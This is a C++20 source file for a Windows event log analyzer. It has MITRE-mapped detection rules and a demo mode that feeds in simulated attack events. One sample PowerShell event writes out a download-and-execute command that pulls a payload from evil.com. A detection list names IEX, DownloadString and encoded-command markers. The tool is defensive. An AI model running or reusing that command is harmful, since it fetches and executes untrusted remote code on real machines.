// NullSec EventLog - Windows Event Log Analyzer
// C++ security tool demonstrating:
//   - Modern C++20 features
//   - RAII for resource management
//   - Template metaprogramming
//   - Smart pointers
//   - Concepts and ranges
//
// Author: bad-antics
// License: MIT

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <unordered_map>
#include <memory>
#include <chrono>
#include <algorithm>
#include <ranges>
#include <optional>
#include <variant>
#include <functional>
#include <span>
#include <cstdint>

namespace nullsec {

constexpr auto VERSION = "1.0.0";

// ANSI Colors
namespace color {
    constexpr auto red = "\x1b[31m";
    constexpr auto green = "\x1b[32m";
    constexpr auto yellow = "\x1b[33m";
    constexpr auto cyan = "\x1b[36m";
    constexpr auto gray = "\x1b[90m";
    constexpr auto reset = "\x1b[0m";
}

// Severity enum
enum class Severity {
    Critical,
    High,
    Medium,
    Low,
    Info
};

constexpr std::string_view severity_to_string(Severity s) {
    switch (s) {
        case Severity::Critical: return "CRITICAL";
        case Severity::High: return "HIGH";
        case Severity::Medium: return "MEDIUM";
        case Severity::Low: return "LOW";
        case Severity::Info: return "INFO";
    }
    return "UNKNOWN";
}

constexpr std::string_view severity_color(Severity s) {
    switch (s) {
        case Severity::Critical:
        case Severity::High:
            return color::red;
        case Severity::Medium:
            return color::yellow;
        case Severity::Low:
            return color::cyan;
        case Severity::Info:
            return color::gray;
    }
    return color::reset;
}

// Event log sources
enum class EventSource {
    Security,
    System,
    Application,
    PowerShell,
    Sysmon,
    DefenderATP
};

constexpr std::string_view source_to_string(EventSource s) {
    switch (s) {
        case EventSource::Security: return "Security";
        case EventSource::System: return "System";
        case EventSource::Application: return "Application";
        case EventSource::PowerShell: return "PowerShell";
        case EventSource::Sysmon: return "Sysmon";
        case EventSource::DefenderATP: return "DefenderATP";
    }
    return "Unknown";
}

// Event log record
struct EventRecord {
    uint64_t event_id{0};
    EventSource source{EventSource::Security};
    std::chrono::system_clock::time_point timestamp;
    std::string computer_name;
    std::string user_name;
    std::string message;
    std::map<std::string, std::string> data;
};

// Detection rule
struct Rule {
    std::string name;
    std::string description;
    std::string mitre_id;
    Severity severity;
    uint64_t event_id;
    EventSource source;
    std::function<bool(const EventRecord&)> predicate;
};

// Finding
struct Finding {
    Severity severity;
    std::string rule_name;
    std::string mitre_id;
    EventRecord event;
    std::string description;
    std::vector<std::string> iocs;
    std::string recommendation;
};

// Critical Event IDs
struct EventIds {
    // Security Log
    static constexpr uint64_t LOGON_SUCCESS = 4624;
    static constexpr uint64_t LOGON_FAILURE = 4625;
    static constexpr uint64_t SPECIAL_LOGON = 4672;
    static constexpr uint64_t ACCOUNT_CREATED = 4720;
    static constexpr uint64_t ACCOUNT_ENABLED = 4722;
    static constexpr uint64_t PASSWORD_CHANGE = 4723;
    static constexpr uint64_t GROUP_MEMBER_ADD = 4728;
    static constexpr uint64_t SECURITY_LOG_CLEARED = 1102;
    static constexpr uint64_t AUDIT_POLICY_CHANGE = 4719;
    static constexpr uint64_t PROCESS_CREATE = 4688;
    static constexpr uint64_t SCHEDULED_TASK = 4698;
    static constexpr uint64_t SERVICE_INSTALL = 4697;
    static constexpr uint64_t FIREWALL_RULE = 4946;
    
    // Sysmon
    static constexpr uint64_t SYSMON_PROCESS_CREATE = 1;
    static constexpr uint64_t SYSMON_FILE_CREATE_TIME = 2;
    static constexpr uint64_t SYSMON_NETWORK_CONNECT = 3;
    static constexpr uint64_t SYSMON_SERVICE_STATE = 4;
    static constexpr uint64_t SYSMON_PROCESS_TERMINATE = 5;
    static constexpr uint64_t SYSMON_DRIVER_LOAD = 6;
    static constexpr uint64_t SYSMON_IMAGE_LOAD = 7;
    static constexpr uint64_t SYSMON_CREATE_REMOTE_THREAD = 8;
    static constexpr uint64_t SYSMON_RAW_ACCESS_READ = 9;
    static constexpr uint64_t SYSMON_PROCESS_ACCESS = 10;
    static constexpr uint64_t SYSMON_FILE_CREATE = 11;
    static constexpr uint64_t SYSMON_REGISTRY_EVENT = 12;
    static constexpr uint64_t SYSMON_FILE_CREATE_STREAM = 15;
    static constexpr uint64_t SYSMON_PIPE_CREATED = 17;
    static constexpr uint64_t SYSMON_WMI_EVENT = 19;
    static constexpr uint64_t SYSMON_DNS_QUERY = 22;
    
    // PowerShell
    static constexpr uint64_t PS_SCRIPT_BLOCK = 4104;
    static constexpr uint64_t PS_MODULE_LOAD = 4103;
};

// Event log analyzer
class EventLogAnalyzer {
public:
    EventLogAnalyzer() {
        initialize_rules();
    }

    void analyze_event(const EventRecord& event) {
        for (const auto& rule : rules_) {
            if (rule.event_id == event.event_id && 
                rule.source == event.source &&
                rule.predicate(event)) {
                
                findings_.push_back(Finding{
                    .severity = rule.severity,
                    .rule_name = rule.name,
                    .mitre_id = rule.mitre_id,
                    .event = event,
                    .description = rule.description,
                    .iocs = {},
                    .recommendation = "Investigate the activity"
                });
            }
        }
    }

    [[nodiscard]] const std::vector<Finding>& findings() const {
        return findings_;
    }

    [[nodiscard]] size_t events_analyzed() const {
        return events_analyzed_;
    }

    void increment_analyzed() {
        events_analyzed_++;
    }

private:
    std::vector<Rule> rules_;
    std::vector<Finding> findings_;
    size_t events_analyzed_{0};

    void initialize_rules() {
        // Failed logon attempts
        rules_.push_back(Rule{
            .name = "Brute Force Attempt",
            .description = "Multiple failed logon attempts detected",
            .mitre_id = "T1110",
            .severity = Severity::High,
            .event_id = EventIds::LOGON_FAILURE,
            .source = EventSource::Security,
            .predicate = [](const EventRecord&) { return true; }
        });

        // Security log cleared
        rules_.push_back(Rule{
            .name = "Log Clearing",
            .description = "Security event log was cleared",
            .mitre_id = "T1070.001",
            .severity = Severity::Critical,
            .event_id = EventIds::SECURITY_LOG_CLEARED,
            .source = EventSource::Security,
            .predicate = [](const EventRecord&) { return true; }
        });

        // New admin account
        rules_.push_back(Rule{
            .name = "Account Creation",
            .description = "New user account created",
            .mitre_id = "T1136",
            .severity = Severity::Medium,
            .event_id = EventIds::ACCOUNT_CREATED,
            .source = EventSource::Security,
            .predicate = [](const EventRecord&) { return true; }
        });

        // Remote thread creation (Sysmon)
        rules_.push_back(Rule{
            .name = "Remote Thread Injection",
            .description = "Thread created in remote process",
            .mitre_id = "T1055",
            .severity = Severity::Critical,
            .event_id = EventIds::SYSMON_CREATE_REMOTE_THREAD,
            .source = EventSource::Sysmon,
            .predicate = [](const EventRecord&) { return true; }
        });

        // Process access (credential theft)
        rules_.push_back(Rule{
            .name = "LSASS Access",
            .description = "Process accessed LSASS memory",
            .mitre_id = "T1003.001",
            .severity = Severity::Critical,
            .event_id = EventIds::SYSMON_PROCESS_ACCESS,
            .source = EventSource::Sysmon,
            .predicate = [](const EventRecord& e) {
                auto it = e.data.find("TargetImage");
                return it != e.data.end() && 
                       it->second.find("lsass.exe") != std::string::npos;
            }
        });

        // Suspicious PowerShell
        rules_.push_back(Rule{
            .name = "Suspicious PowerShell",
            .description = "PowerShell script block with suspicious content",
            .mitre_id = "T1059.001",
            .severity = Severity::High,
            .event_id = EventIds::PS_SCRIPT_BLOCK,
            .source = EventSource::PowerShell,
            .predicate = [](const EventRecord& e) {
                const auto& msg = e.message;
                return msg.find("-enc") != std::string::npos ||
                       msg.find("IEX") != std::string::npos ||
                       msg.find("DownloadString") != std::string::npos ||
                       msg.find("FromBase64String") != std::string::npos;
            }
        });

        // Scheduled task creation
        rules_.push_back(Rule{
            .name = "Scheduled Task Created",
            .description = "New scheduled task was created",
            .mitre_id = "T1053.005",
            .severity = Severity::Medium,
            .event_id = EventIds::SCHEDULED_TASK,
            .source = EventSource::Security,
            .predicate = [](const EventRecord&) { return true; }
        });

        // Service installation
        rules_.push_back(Rule{
            .name = "Service Installed",
            .description = "New service was installed",
            .mitre_id = "T1543.003",
            .severity = Severity::Medium,
            .event_id = EventIds::SERVICE_INSTALL,
            .source = EventSource::Security,
            .predicate = [](const EventRecord&) { return true; }
        });

        // Suspicious network connection (Sysmon)
        rules_.push_back(Rule{
            .name = "Suspicious Network Connection",
            .description = "Process made outbound network connection",
            .mitre_id = "T1071",
            .severity = Severity::Low,
            .event_id = EventIds::SYSMON_NETWORK_CONNECT,
            .source = EventSource::Sysmon,
            .predicate = [](const EventRecord&) { return true; }
        });
    }
};

// Output functions
void print_banner() {
    std::cout << "\n";
    std::cout << "╔══════════════════════════════════════════════════════════════════╗\n";
    std::cout << "║           NullSec EventLog - Windows Event Log Analyzer          ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════════════╝\n";
    std::cout << "\n";
}

void print_usage() {
    std::cout << "USAGE:\n";
    std::cout << "    eventlog [OPTIONS] <evtx_file>\n";
    std::cout << "\n";
    std::cout << "OPTIONS:\n";
    std::cout << "    -h, --help      Show this help\n";
    std::cout << "    -l, --live      Analyze live event logs\n";
    std::cout << "    -f, --file      Analyze EVTX file\n";
    std::cout << "    -j, --json      JSON output\n";
    std::cout << "    -s, --source    Filter by source (Security, Sysmon, etc.)\n";
    std::cout << "\n";
    std::cout << "CRITICAL EVENT IDs:\n";
    std::cout << "    • 4624/4625     Logon Success/Failure\n";
    std::cout << "    • 4720          Account Created\n";
    std::cout << "    • 4688          Process Created\n";
    std::cout << "    • 1102          Log Cleared\n";
    std::cout << "    • Sysmon 1-22   Process/Network/Registry\n";
    std::cout << "\n";
    std::cout << "EXAMPLES:\n";
    std::cout << "    eventlog Security.evtx\n";
    std::cout << "    eventlog -l -s Sysmon\n";
    std::cout << "    eventlog -j Application.evtx\n";
}

void print_finding(const Finding& finding) {
    std::cout << "\n";
    std::cout << "  " << severity_color(finding.severity)
              << "[" << severity_to_string(finding.severity) << "]"
              << color::reset << " " << finding.rule_name;
    if (!finding.mitre_id.empty()) {
        std::cout << " (" << finding.mitre_id << ")";
    }
    std::cout << "\n";
    std::cout << "    Event ID: " << finding.event.event_id 
              << " (" << source_to_string(finding.event.source) << ")\n";
    std::cout << "    User: " << finding.event.user_name << "\n";
    std::cout << "    " << finding.description << "\n";
    if (!finding.event.message.empty()) {
        std::cout << "    Message: " << finding.event.message.substr(0, 80) << "...\n";
    }
    std::cout << color::gray << "    Recommendation: " 
              << finding.recommendation << color::reset << "\n";
}

void print_stats(const EventLogAnalyzer& analyzer) {
    std::cout << "\n";
    std::cout << color::gray << "═══════════════════════════════════════════"
              << color::reset << "\n";
    std::cout << "\n";
    std::cout << "  Statistics:\n";
    std::cout << "    Analyzed:   " << analyzer.events_analyzed() << " events\n";
    std::cout << "    Findings:   " << analyzer.findings().size() << "\n";

    int critical = 0, high = 0, medium = 0;
    for (const auto& f : analyzer.findings()) {
        switch (f.severity) {
            case Severity::Critical: critical++; break;
            case Severity::High: high++; break;
            case Severity::Medium: medium++; break;
            default: break;
        }
    }
    std::cout << "    Critical:   " << critical << "\n";
    std::cout << "    High:       " << high << "\n";
    std::cout << "    Medium:     " << medium << "\n";
}

// Demo mode
void demo_mode() {
    std::cout << color::yellow << "[Demo Mode]" << color::reset << "\n\n";

    EventLogAnalyzer analyzer;
    auto now = std::chrono::system_clock::now();

    // Simulate suspicious events
    std::vector<EventRecord> demo_events = {
        {EventIds::SECURITY_LOG_CLEARED, EventSource::Security, now,
         "WORKSTATION", "SYSTEM", "Security log was cleared", {}},
        {EventIds::LOGON_FAILURE, EventSource::Security, now,
         "WORKSTATION", "admin", "Failed logon attempt", 
         {{"SubjectUserName", "anonymous"}}},
        {EventIds::SYSMON_CREATE_REMOTE_THREAD, EventSource::Sysmon, now,
         "WORKSTATION", "attacker", "Remote thread created",
         {{"SourceImage", "C:\\Temp\\malware.exe"}, {"TargetImage", "explorer.exe"}}},
        {EventIds::SYSMON_PROCESS_ACCESS, EventSource::Sysmon, now,
         "WORKSTATION", "attacker", "Process memory accessed",
         {{"SourceImage", "mimikatz.exe"}, {"TargetImage", "C:\\Windows\\System32\\lsass.exe"}}},
        {EventIds::PS_SCRIPT_BLOCK, EventSource::PowerShell, now,
         "WORKSTATION", "user", "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", {}},
        {EventIds::ACCOUNT_CREATED, EventSource::Security, now,
         "DC01", "Administrator", "New account created: backdoor", {}},
        {EventIds::SCHEDULED_TASK, EventSource::Security, now,
         "WORKSTATION", "user", "Scheduled task created: persistence", {}},
    };

    std::cout << color::cyan << "Analyzing Windows Event Logs..." 
              << color::reset << "\n\n";

    std::cout << "Processing Events:\n\n";
    for (const auto& event : demo_events) {
        std::cout << "  [" << source_to_string(event.source) << "] "
                  << "Event " << event.event_id << ": "
                  << event.message.substr(0, 50) << "...\n";
        analyzer.analyze_event(event);
        analyzer.increment_analyzed();
    }

    std::cout << "\nSecurity Findings:\n";
    for (const auto& finding : analyzer.findings()) {
        print_finding(finding);
    }

    print_stats(analyzer);
}

} // namespace nullsec

int main(int argc, char* argv[]) {
    nullsec::print_banner();

    if (argc <= 1) {
        nullsec::print_usage();
        std::cout << "\n";
        nullsec::demo_mode();
        return 0;
    }

    std::string arg = argv[1];
    if (arg == "-h" || arg == "--help") {
        nullsec::print_usage();
        return 0;
    }

    nullsec::print_usage();
    return 0;
}
